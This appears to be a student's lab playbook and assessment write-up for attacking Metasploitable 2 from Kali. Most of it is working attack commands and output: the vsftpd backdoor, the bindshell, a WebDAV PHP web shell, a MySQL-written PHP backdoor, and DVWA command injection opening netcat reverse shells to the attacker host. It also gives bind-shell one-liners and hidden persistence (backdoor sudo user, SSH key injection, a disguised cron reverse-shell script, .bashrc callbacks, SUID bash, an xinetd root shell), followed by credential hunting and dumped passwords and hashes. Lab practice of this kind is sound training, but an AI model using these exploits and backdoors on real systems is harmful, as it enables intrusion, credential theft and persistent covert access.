Playbook
(Note: Kali IP=192.168.100.18, Metasploit IP=192.168.100.46)

Reconnaissance:
    • Using tools to get information about the attack
    • Tools like netdiscover, netcat, nmap, gobuster, wireshark etc
    • scan the network, its ports, sniff the packets read the data and decrypt the data etc
      
      
      Exploitations:
                1. BACKDOOR vsftpd 2.3.4:
                   Successfully connected to metasploit via backdoor as it open the backdoor port 6200 after connecting to metasploit with port 21 using the command
	TERMINAL 1
			> nc 192.168.100.46 21
			> USER user:)
			> PASS irrelevent
		TERMINAL 2
			> nc 192.168.100.46 6200
			> whoami
			> root
        2. xinetd bindshell
           Connect with the already present open port listening on port 1524 and I connect with commands nc 192.168.100.46 1524
           whoami
           root 
        3. MITM attack
           Poison the victim machine in thinking that I am the router and router that I am the victim machine and start port forwarding on my own machine so every packet of the victim will pass through my system and I can sniff them using wireshark etc
            1. Telnet: Data in the packets can be viewed as a plain text eg user name and password etc
            2. SSH: The Packets can be sniffed but the data is encrypted
        4. SAMBA: 
The attack is successfully executed first by connecting to samba using terminal with the command of smbclient //192.1688.100.46/tmp -N, and secondly using the msfconsole exploit by setting the IPs and ports of the systems.
        5. WebDev
WebDev have service called cadaver using which we can access the dav and can do LFI attack
bash
cadaver http://192.168.100.46/dav/
use put command to export the below file to the victim machine
put /etc/shell2.php

it will give us access to the webdev in kali create shell2.php file with the cmd input file like 
<html>
	<body>
	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
	<input type="TEXT" name="cmd" id="cmd" size="80">
	<input type="SUBMIT" value="Execute">
	</form>
	<pre>
	<?php
    	if(isset($_GET['cmd']))
    	{
    	    system($_GET['cmd']);
    	}
	?>
	</pre>
	</body>
	</html>

in browser open http://192.168.100.46/dav/shell2.php
it will open a webpage with input field where we can type terminal commands

        6. MySql root Access
The commands to get root access using mysql are
mysql -h 192.168.100.46 -u root –skip-ssl
show databases;
use mysql;
show tables;
MySQL [mysql]> select "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/tmp/backdoor2.php';

select LOAD_FILE(‘/etc/passwd’);

        7. DVWA
In the command execution page type this command 127.0.0.1; nc -e /bin/bash 192.168.100.18 	1234 to start reverse shell and listen in your kali as nc -lvnp 1234

	these are some delimeters use in the command injection
	;
	||
	|
	&&
	$(whoami)


ISSUES:
    1. vsftpd: when try to connect after giving password it immediately stop the session 
        I. ┌──(sulaman㉿kali)-[~]
           └─$ nc 192.168.100.46 21
           220 (vsFTPd 2.3.4)
           USER user:)
           331 Please specify the password.
           PASS irr
                                                                                           
           ┌──(sulaman㉿kali)-[~]


	I have seen this happen sometimes
	I resolve it by closing the connections and restarting after that It works fine again



EXTRAS:
Persistence (Temporary)
Create a backdoor user so you can log in later (this is what real attackers do):
bash
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor
sh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.100.46

BONUS:

    1. EXECUTE BASH WHEN CONNECT TO VICTIM
Command:  -e /bin/bash & 
(NOTE: Defender can find it easily, not very good)

Method 1: Netcat (Simplest)
bash
nc -lvp 4444 -e /bin/bash
    • -l: Listen mode
    • -v: Verbose
    • -p 4444: Port number
    • -e /bin/bash: Execute bash upon connection
    • &  runs it in the background (Optional)

Method 2: Netcat with Named Pipe (When -e is Unavailable)
bash
mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f

Method 3: Python One-Liner
bash
python -c 'import socket,os,pty; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); c,a=s.accept(); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); pty.spawn("/bin/bash")'

Method 4: Socat (The Swiss Army Knife)
bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

    2. START REVERSE SHELL FROM VICTIM MACHINE
nc -e /bin/bash 192.168.100.18 5555

    3. USEFUL COMMANDS

# Find backup files that might contain credentials
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
find / -name "*.sql" 2>/dev/null | grep -v /var/lib/mysql
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | grep -v /proc

Artifact	Where to Look

Listening ports	netstat -tulpn	Look for unusual ports with /bin/sh or /bin/bash as the process.
Unusual processes	ps aux	Netcat running in listen mode stands out.

Firewall rules	iptables -L	Check for newly opened ports
Cron jobs	crontab -l, /etc/cron.*/	Backdoors often restart via scheduled tasks.




FIRST SEMESTER ASSESSMENT

Challenge 1:

1) Run a full Nmap scan and save output
nmap -p- 192.168.100.46 > ~/nmapfullscan.txt

2) Enumerate all web directories with gobuster
    I. gobuster dir -u http://192.168.100.46 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.46
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 291]
.htpasswd            (Status: 403) [Size: 296]
.htaccess            (Status: 403) [Size: 296]
.bash_history        (Status: 200) [Size: 77]
cgi-bin/             (Status: 403) [Size: 295]
dav                  (Status: 301) [Size: 319] [--> http://192.168.100.46/dav/]
index                (Status: 200) [Size: 891]
index.php            (Status: 200) [Size: 891]
phpMyAdmin           (Status: 301) [Size: 326] [--> http://192.168.100.46/phpMyAdmin/]
phpinfo.php          (Status: 200) [Size: 48026]
phpinfo              (Status: 200) [Size: 48014]
test                 (Status: 301) [Size: 320] [--> http://192.168.100.46/test/]
twiki                (Status: 301) [Size: 321] [--> http://192.168.100.46/twiki/]
server-status        (Status: 403) [Size: 300]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
    II. http://192.168.100.46/dav/===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.46/dav
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

.hta                 (Status: 403) [Size: 295]
.htaccess            (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 300]
test                 (Status: 200) [Size: 3393]
test2                (Status: 200) [Size: 3393]
shell                (Status: 200) [Size: 0]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
       
    III. http://192.168.100.46/phpMyAdmin
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.46/dav
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

.hta                 (Status: 403) [Size: 295]
.htaccess            (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 300]
test                 (Status: 200) [Size: 3393]
test2                (Status: 200) [Size: 3393]
shell                (Status: 200) [Size: 0]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
    IV. http://192.168.100.46/test
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.46/test
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 296]
.htpasswd            (Status: 403) [Size: 301]
.htaccess            (Status: 403) [Size: 301]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
    V. http://192.168.100.46/twiki
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.46/twiki
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 297]
.htpasswd            (Status: 403) [Size: 302]
.htaccess            (Status: 403) [Size: 302]
bin                  (Status: 301) [Size: 325] [--> http://192.168.100.46/twiki/bin/]
data                 (Status: 403) [Size: 297]
index                (Status: 200) [Size: 782]
index.html           (Status: 200) [Size: 782]
lib                  (Status: 301) [Size: 325] [--> http://192.168.100.46/twiki/lib/]
license              (Status: 200) [Size: 19440]
pub                  (Status: 301) [Size: 325] [--> http://192.168.100.46/twiki/pub/]
readme               (Status: 200) [Size: 4334]
templates            (Status: 403) [Size: 302]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

3) EXPLOIT ATLEAST 5 DIFFERENT SERVICES

    1. BACKDOOR vsftpd 2.3.4:
	Successfully connected to metasploit via backdoor as it open the backdoor port 6200 after connecting to metasploit with port 21 using the command 
	TERMINAL 1
		> nc 192.168.100.46 21
		> USER user:)
		> PASS irrelevent
	TERMINAL 2
		> nc 192.168.100.46 6200
		> whoami
		> root
    2. xinetd bindshell
	Connect with the already present open port listening on port 1524 and I connect with commands nc 192.168.100.46 1524
whoami
root 
    3. MITM attack
	Poison the victim machine in thinking that I am the router and router that I am the victim machine and start port forwarding on my own machine so every packet of the victim will pass through my system and I can sniff them using wireshark etc

        1. Telnet: Data in the packets can be viewed as a plain text eg user name and password etc
        2. SSH: The Packets can be sniffed but the data is encrypted

    4. SAMBA: 
	The attack is successfully executed first by connecting to samba using terminal with the command of smbclient //192.1688.100.46/tmp -N, and secondly using the msfconsole exploit by setting the IPs and ports of the systems.

4 Extract at least 20 user credentials (hashes or plaintext)
cid | username | password   
+-----+----------+--------------
|   1 | admin    | adminpass    
|   2 | adrian   | somepassword 
|   3 | john     | monkey       
|   4 | jeremy   | password   
|   5 | bryce    | password    
|   6 | samurai  | samurai     
|   7 | jim      | password     
|   8 | bobby    | password  
|   9 | simba    | password  
|  10 | dreveil  | password 
|  11 | scotty   | password  
|  12 | cal      | password    
|  13 | john     | password   
|  14 | kevin    | 42           
|  15 | dave     | set          
|  16 | ed       | pentest
|  17 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99
|  18 | gordonb | e99a18c428cb38d5f260853678922e03
|  19 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b
|  20 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7
|  21 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99

5) Establish two different persistence methods

Method 1:
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor
sh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.100.46

Method 2:
MITM will give persistence even if we continusly execute the arpspoofing even after victim restart the system attacker can access it.

Method 3: (SSH KEY INJECTION - PASSWORD LESS LOGIN USING OUR OWN GENERATED KEYS)
Create a key using the command in kali 
ssh-keygen -t rsa -f persistence_key -N “”
put the created persistence_key.pub in the metasploit or any compromised victim machine private key files like:
in metasploit terminal as a root type command:
File 1: (/root/.ssh/authorized_keys)
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnii/f+7g9cFfwAQtaMx5uW3Kuu6YtYHDnRx59P1UUtZMV/iTo0o/TkaS58loLsnUZUktC71GLlOzHqzQpttB2wPfeewW7F41pga8zI31w1ARSBxoYxPUCpD5Soo9vWl6gR2zidD4fqMUeHAW9YB4F+ZhlSyOpplJvimTJwbVBQC784K/dob3ZY/GnKsx4plu4E71XMj08A7F89Y8LGw0cAFOY30wJ9ZuV6rJ4uLaNY5E1gXM0Y1/l4T1A4PjalgrgkrbuCPOq7/jAb17T7R1izMb9gD3niw1p0i4k0buR/1B2JFFSaqoH2RMMFioM49ut0/VPimKi3R2Tjx1yMH8LHbEKaUd+B9Y7xTaOXSnUjYwwm/SUFj3I18l/c2oTgdO7mLZHnl9NpBnMA2llWXkJr1p0gUiTXSq5r98hGKyVm1/NqRf2d6tCj9mIQVLlZenShIfbZJCB2j5/iT0lB4igNTAP6GVAQXudjB1++eElskkeBKA2PeH0J5gOheV1atE= sulaman@kali" >> /root/.ssh/authorized_keys

File 2: (/home/msfadmin/.ssh/authorized_keys)
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnii/f+7g9cFfwAQtaMx5uW3Kuu6YtYHDnRx59P1UUtZMV/iTo0o/TkaS58loLsnUZUktC71GLlOzHqzQpttB2wPfeewW7F41pga8zI31w1ARSBxoYxPUCpD5Soo9vWl6gR2zidD4fqMUeHAW9YB4F+ZhlSyOpplJvimTJwbVBQC784K/dob3ZY/GnKsx4plu4E71XMj08A7F89Y8LGw0cAFOY30wJ9ZuV6rJ4uLaNY5E1gXM0Y1/l4T1A4PjalgrgkrbuCPOq7/jAb17T7R1izMb9gD3niw1p0i4k0buR/1B2JFFSaqoH2RMMFioM49ut0/VPimKi3R2Tjx1yMH8LHbEKaUd+B9Y7xTaOXSnUjYwwm/SUFj3I18l/c2oTgdO7mLZHnl9NpBnMA2llWXkJr1p0gUiTXSq5r98hGKyVm1/NqRf2d6tCj9mIQVLlZenShIfbZJCB2j5/iT0lB4igNTAP6GVAQXudjB1++eElskkeBKA2PeH0J5gOheV1atE= sulaman@kali" >> /home/msfadmin/.ssh/authorized_keys
 
and try to login as:
Commands
ssh -vvv -i persistence_key -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.100.46

ssh -i persistence_key -oHostKeyAlgorithms=+ssh-rsa root@192.168.100.46

Method 4: (CRON JOB REVERSE SHELL)
Write a python script in the metasploit which will try to connect back to the kali after every minute so we can connect any time when we want.
The commands are

PYTHON SCRIPT AND CRONTAB WHICH WILL SCHEDULE THE SCRIPT EXECUTION AUTOMATICALLY
echo '#!/bin/bash' > /var/tmp/.update.sh
echo 'while true; do nc -e /bin/bash 192.168.100.18 5555 2>/dev/null; sleep 60; done' >> /var/tmp/.update.sh
chmod +x /var/tmp/.update.sh

THE COMMAND TO SCHEDULE THE EXECUTION OF SCRIPT 
echo "@reboot root /var/tmp/.update.sh &" >> /etc/crontab

IN KALI CONNECT TO THE METASPLOIT ANYTIME
nc 192.168.100.46 5555

Method 5: (.bashrc BACKDOOR)
Modify a user's .bashrc so every time they open a terminal, you get a shell:
COMMANDS
echo 'nc -e /bin/bash 192.168.100.18 5555 2>/dev/null &' >> /root/.bashrc
echo 'nc -e /bin/bash 192.168.100.18 5555 2>/dev/null &' >> /home/msfadmin/.bashrc

Method 6: (SUID BINARY PLANT)
cp /bin/bash /var/tmp/.bash
chmod 4777 /var/tmp/.bash

Now any user who runs /var/tmp/.bash gets a root shell:
/var/tmp/.bash -p

Method 6: (XINETD BACKDOOR)
Commands
echo "service backdoor
{
    type = UNLISTED
    port = 44444
    socket_type = stream
    wait = no
    user = root
    server = /bin/bash
    server_args = -i
}" > /etc/xinetd.d/backdoor

/etc/init.d/xinetd restart
	
Connect: nc 192.168.100.46 44444

Challenge 2:
# Penetration Test Report: Metasploitable 2

## Executive Summary
Scanning the metasploit ip address give me the very nice insight about the services running, on which ports they are running, open and close ports, info about the operating system and most importantly the versions of services currently running.

## Findings Summary
[Number of critical, high, medium, low findings]
There are 9 critical exploits which give me the complete access of the system as root, there are also some medium and low level vulnerabilities such as the level of vulnerability adjustable in the DVWA form high to low.
 
## Critical Findings
1. Backdoor - High – Update to new version
2. Reverse Shell – High 
3. Bind Shell – High
4. Sql Injection
5. LFI, RFI

## Access Methods Discovered
    1. vsftpd backdoor
    2. Bindshell 1524
    3. Samba usermap
    4. Telnet access
    5. SSH with default credentials
    6. WebDAV webshell
    7. DVWA command injection
    8. MySQL root access
    9. LFI file reading


## Compromised Credentials
[List all usernames and passwords extracted]
|   1 | admin    | adminpass    
|   2 | adrian   | somepassword 
|   3 | john     | monkey       
|   4 | jeremy   | password   
|   5 | bryce    | password    
|   6 | samurai  | samurai     
|   7 | jim      | password     
|   8 | bobby    | password  
|   9 | simba    | password  
|  10 | dreveil  | password 
|  11 | scotty   | password  
|  12 | cal      | password    
|  13 | john     | password   
|  14 | kevin    | 42           
|  15 | dave     | set          
|  16 | ed       | pentest
|  17 | ?:password
|  18 | ?:abc123
|  19 | ?:charley
|  20 | ?:letmein

## Recommendations
[How to fix the vulnerabilities]
Vulnerabilities can be fixed by continuously updating all the apps regularly

Challenge 3: Set Your Next Goal
Write down:
    • Which certification you'll pursue: OSCP (OffSec)
    • Which platform you'll practice on: VulnHub, TryHackMe, PentesterLab, HackTheBox (free would be great)
    • What skill you'll learn next: HackTheBox, Windows Privilege Escalation, Active Directory Attacks, Burp Suite, C2 Frameworks
    • Your timeline for the next 3 months



OTHERS
┌──(sulaman㉿kali)-[~]
└─$ nc 192.168.100.46 6200
find / -name "authorized_keys" 2>/dev/null
/home/msfadmin/.ssh/authorized_keys
/root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys 2>/dev/null
ssh-dss AAAAB3NzaC1kc3MAAACBANWgcbHvxF2YRX0gTizyoZazzHiU5+63hKFOhzJch8dZQpFU5gGkDkZ30rC4jrNqCXNDN50RA4ylcNtO78B/I4+5YCZ39faSiXIoLfi8tOVWtTtg3lkuv3eSV0zuSGeqZPHMtep6iizQA5yoClkCyj8swXH+cPBG5uRPiXYL911rAAAAFQDL+pKrLy6vy9HCywXWZ/jcPpPHEQAAAIAgt+cN3fDT1RRCYz/VmqfUsqW4jtZ06kvx3L82T2Z1YVeXe7929JWeu9d3OB+NeE8EopMiWaTZT0WI+OkzxSAGyuTskue4nvGCfxnDr58xa1pZcSO66R5jCSARMHU6WBWId3MYzsJNZqTN4uoRa4tIFwM8X99K0UUVmLvNbPByEAAAAIBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5ZxtXeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvPlbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytg== user@metasploitable

cat /root/.bash_history
cat ~/.bash_history
cat /home/*/.bash_history
cat /home/*/.mysql_history
cat /root/.mysql_histroy
cat /root/.mysql_history
cat /home/*/.nano_history
cat /home/*/.viminfo    

grep -r "password" /etc/ --include="*.conf" 2>/dev/null
grep -r "passwd" /etc/ --include="*.conf" 2>/dev/null
cat /etc/mysql/debian.cnf

/etc/unreal/unrealircd.conf:
    password "ILiKEopeRING1022";
    password-connect "Sup3rSERViCE";
    password-receive "Sup3rSERViCE";
    password        LovingTheKwlHost;

Source	Credential	Type
/etc/unreal/unrealircd.conf	ILiKEopeRING1022	IRC Operator password
/etc/unreal/unrealircd.conf	Sup3rSERViCE	IRC Link password
/etc/unreal/unrealircd.conf	LovingTheKwlHost	IRC Host password
/etc/mysql/debian.cnf	debian-sys-maint / (blank)	MySQL maintenance user
.mysql_history	Proof MySQL root was intentionally set to no password	Evidence
/home/user/.ssh/authorized_keys	SSH key for user account	Key-based auth
VNC /root/.vnc/passwd	password	VNC desktop access
Shadow backup	sys:batman, klog:123456789, service:service	System passwords
